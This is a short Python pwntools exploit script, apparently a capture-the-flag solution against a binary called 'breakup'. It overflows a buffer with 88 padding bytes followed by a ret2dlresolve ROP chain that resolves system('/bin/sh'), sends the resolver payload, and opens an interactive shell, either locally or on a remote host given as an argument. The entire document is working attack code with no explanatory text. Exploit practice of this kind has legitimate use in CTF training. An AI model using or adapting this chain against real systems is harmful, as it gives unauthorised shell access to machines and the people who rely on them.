from pwn import *

context.binary = 'breakup'

# Make Ret2DLResolve Payload
rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(context.binary, symbol='system', args=['/bin/sh\x00'])
rop.read(0, dlresolve.data_addr)
rop.raw(rop.ret[0])
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
pprint(rop.dump())

if len(sys.argv) == 1:
    io = context.binary.process()
else:
    host, port = sys.argv[1].split(':')
    io = remote(host, port)

try:
    io.sendline(b'A' * 88 + raw_rop)
    io.sendline(dlresolve.payload)
    io.interactive()
except EOFError:
    pass
